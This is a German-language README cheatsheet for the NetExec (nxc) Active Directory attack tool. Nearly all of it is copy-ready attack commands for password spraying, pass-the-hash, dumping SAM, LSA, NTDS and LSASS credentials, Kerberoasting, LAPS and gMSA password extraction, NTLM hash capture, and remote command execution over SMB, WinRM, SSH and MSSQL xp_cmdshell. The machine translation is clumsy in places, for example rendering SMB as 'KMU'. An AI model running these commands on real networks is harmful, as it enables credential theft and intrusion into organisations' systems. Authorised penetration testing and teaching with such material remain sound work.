<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME-Nachfolger">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Netzwerk-Pentesting">
</p>

<p align="center">
  <b>🌐 Der offizielle, von der Community betriebene Nachfolger von CrackMapExec für die Netzwerk- und Active Directory-Ausnutzung</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-Einführung)
- [Warum NetExec statt CrackMapExec?](#-why-netexec-over-crackmapexec)
- [Installation](#-Installation)
- [Unterstützte Protokolle](#-supported-protocols)
- [SMB-Ausbeutung](#-smb-exploitation)
  - [Reconnaissance & Share Enumeration](#reconnaissance--share-enumeration)
  - [Password Spraying & Credential Testing](#password-spraying--credential-testing)
  - [Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Anmeldeinformations-Dumping (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Befehlsausführung](#command-execution)
- [LDAP-Ausnutzung](#-ldap-exploitation)
  - [Domänenaufzählung und Passwortrichtlinie](#domain-enumeration--password-policy)
  - [AS-REP-Röstung und Kerberoasting] (#as-rep-roasting--kerberoasting)
  - [LAPS & gMSA-Extraktion](#laps--gmsa-extraction)
  - [BloodHound-Datenaufnahme](#bloodhound-data-ingestion)
- [MSSQL-Ausbeutung](#-mssql-exploitation)
- [WinRM-, RDP- und SSH-Module](#-winrm-rdp--ssh-modules)
- [Beliebte NetExec-Module (`-M`)](#-popular-netexec-modules--m)
- [Arbeitsbereiche und integrierte Datenbank](#-workspaces--built-in-database)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Tipps und Best Practices](#-tips--best-practices)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung

**NetExec** (`nxc`) ist ein vielseitiges Post-Exploitation-Tool, das zur Automatisierung der Bewertung großer Active Directory- und Windows-Netzwerke entwickelt wurde. Es ist der offizielle, aktive Community-Fork und die Fortsetzung von **CrackMapExec** (CME), das nach der Einstellung von CME erstellt und vom ursprünglichen Autor archiviert wurde.

NetExec fungiert als Netzwerk-„Schweizer Taschenmesser“ und verbindet sich nahtlos mit SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP und VNC, um Authentifizierung, Dumping von Anmeldeinformationen, Schwachstellenprüfungen und laterale Bewegungen zu automatisieren.

---

## ⚖️ Warum NetExec statt CrackMapExec?

| Funktion | CrackMapExec (CME) | NetExec (nxc) |
|---------|------|---------------|
| **Entwicklungsstatus** | 🛑 Archiviert / Veraltet | 🟢 Aktiv gepflegt |
| **Python-Unterstützung** | Legacy (Python 3.8-3.10) | Modernes Python 3.10+ |
| **Protokollunterstützung** | SMB, LDAP, MSSQL, WinRM, SSH | + VNC-, FTP-, RDP- und WMI-Verbesserungen |
| **BloodHound-Unterstützung** | Nur BloodHound Legacy | BloodHound CE & Legacy |
| **Kerberos & PKINIT** | Begrenzt | Robuste PKINIT- und Kerberos-Ticketunterstützung |
| **Fehlerbehebungen und Module** | Gefroren | Ständig aktualisierte CVE- und Exploit-Module |

---

## 📥 Installation

### Verwendung von pipx (empfohlen)
```bash
pipx install netexec
```
### Kali Linux

NetExec ist der offizielle Ersatz für CrackMapExec in Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### Docker
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Verifizierung
```bash
nxc --version
```
---

## 🔌 Unterstützte Protokolle

NetExec akzeptiert das Zielprotokoll als primäres Argument:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` – Server-Nachrichtenblock (Freigaben, SAM/LSA/NTDS-Dumping, Befehlsausführung)
- `nxc ldap` – Lightweight Directory Access Protocol (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` – Microsoft SQL Server (Datenbankabfragen, xp_cmdshell, Identitätswechsel)
- `nxc winrm` – Windows-Remoteverwaltung (heimliche Befehlsausführung)
- `nxc rdp` – Remote Desktop Protocol (Authentifizierungsüberprüfung, Screenshots)
- `nxc ssh` – Secure Shell (Linux/UNIX-Anmeldeinformationen testen und ausführen)
- `nxc ftp` / `nxc vnc` – Dateiübertragung und virtuelles Netzwerk-Computing

---

## 🛡️ SMB-Ausbeutung

### Aufklärung und Aktienaufzählung
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Passwort-Spraying und Anmeldeinformationstests
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Anmeldeinformations-Dumping (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Befehlsausführung
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 LDAP-Ausnutzung

### Domänenaufzählung und Passwortrichtlinie
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP-Röstung und Kerberoastung
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### LAPS- und gMSA-Extraktion
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### BloodHound-Datenaufnahme
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ MSSQL-Ausnutzung
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 WinRM-, RDP- und SSH-Module

### WinRM-Befehlsausführung
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### RDP-Screenshots und Authentifizierung
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### SSH-Sprühen und Befehle
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Beliebte NetExec-Module (`-M`)

| Modul | Protokoll | Beschreibung | Beispiel |
|--------|----------|-------------|---------|
| `spooler` | KMU | Überprüfen Sie, ob der Druckspoolerdienst ausgeführt wird (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | KMU | Auf Sicherheitslücke CVE-2020-1472 prüfen | `nxc smb <IP> -M zerologon` |
| `nopac` | KMU | Suchen Sie nach CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | KMU | Überprüfen Sie, ob der Host für PetitPotam-Zwang anfällig ist | `nxc smb <IP> -M petitpotam` |
| `nanodump` | KMU | LSASS-Speicher-Minidump heimlich mit Nanodump sichern | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | KMU | Überprüfen Sie, ob der WebClient-Dienst für das WebDAV-Relay | aktiv ist `nxc smb <IP> -M webdav` |
| `laps` | LDAP | LAPS-Passwörter für Workstations sichern | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Geheimnisse des gruppenverwalteten Dienstkontos extrahieren | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Arbeitsbereiche und integrierte Datenbank

NetExec zeichnet automatisch alle erkannten Hosts, gültigen Anmeldeinformationen und ausgegebenen Hashes in einer lokalen SQLite-Datenbank (`~/.nxc/workspaces/`) auf:
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Kurzreferenztabelle

| Aufgabe | Protokoll | Befehl |
|------|----------|---------|
| **Anteile aufzählen** | KMU | `nxc smb <IP> -u '' -p '' --shares` |
| **Überprüfen Sie die Pass-Richtlinien** | KMU | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Passwortspray** | KMU | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Übergeben Sie den Hash** | KMU | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **SAM entsorgen** | KMU | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **NTDS sichern** | KMU | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **AS-REP-Röstung** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberösten** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **BloodHound Dump** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Tipps und Best Practices

1. **Überprüfen Sie immer zuerst die Passwortrichtlinie:**
   Führen Sie vor dem Starten eines Passwort-Sprays immer `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` aus, um `Account Lockout Threshold` zu überprüfen. Wenn es auf 3 oder 5 eingestellt ist, sprühen Sie nur einmal alle 30+ Minuten, um eine Sperrung von Domänenkonten zu vermeiden.
2. **Verwenden Sie `--local-auth` für Workstations:**
   Wenn Sie lokale Administratoranmeldeinformationen auf mehreren Arbeitsstationen anstelle von Domänenanmeldeinformationen testen, schließen Sie immer das Flag `--local-auth` ein.
3. **Pivot-Integration:**
   NetExec funktioniert nahtlos über SOCKS-Proxys (z. B. `proxychains nxc smb ...`) oder über Ligolo-ng-TUN-Schnittstellen mit nativer Geschwindigkeit!

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** NetExec ist ein offensives Sicherheitsbewertungstool. Es darf ausschließlich in Computernetzwerken und Domäneninfrastrukturen verwendet werden, für die Sie eine ausdrückliche, dokumentierte Autorisierung erworben haben.

---

## 📚 Ressourcen

- [Offizielles GitHub-Repository von NetExec](https://github.com/Pennyw0rth/NetExec)
- [Offizielle NetExec-Dokumentation](https://www.netexec.wiki/)